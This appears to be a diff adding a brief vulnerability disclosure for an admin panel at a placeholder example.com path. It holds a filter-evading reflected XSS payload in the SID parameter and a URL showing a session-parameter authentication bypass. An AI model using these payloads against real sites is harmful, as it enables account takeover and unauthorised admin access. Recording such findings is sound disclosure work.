@@ -1,0 +1,7 @@
+1- XSS (High)
+  
+http://www.example.com/wl-ssf41/admin/index.php/index?SID=&gt;&quot;&gt;&lt;ScRiPt%20%0a%0d&gt;alert(213771818860)%3B&lt;/ScRiPt&gt;
+
+2- Bay Pass (Medium)
+  
+http://www.example.com/wl-ssf41/admin/index.php/index?SID=xx
